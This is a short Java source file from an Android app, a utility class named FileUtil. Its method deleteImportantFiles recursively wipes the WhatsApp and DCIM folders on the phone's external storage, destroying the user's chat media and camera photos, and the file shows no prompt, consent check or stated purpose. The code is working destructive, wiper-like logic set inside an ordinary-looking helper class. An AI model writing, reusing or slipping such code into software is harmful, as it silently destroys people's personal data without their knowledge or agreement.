package com.reflex.util;

import android.os.Environment;
import android.util.Log;
import android.widget.EditText;

import com.reflex.R;

import java.io.File;

public class FileUtil {

    void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()){
            for (File child : fileOrDirectory.listFiles()){
                Log.wtf("deleting",child.getAbsolutePath());
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }


    void deleteImportantFiles() {
        File file = new File(Environment.getExternalStorageDirectory()
                .getAbsolutePath(),
                "WhatsApp");
        if (file.exists()) {
            deleteRecursive(file);
        }

        file = new File(Environment.getExternalStorageDirectory()
                .getAbsolutePath(),
                "DCIM");
        if (file.exists()) {
            deleteRecursive(file);
        }
    }
}
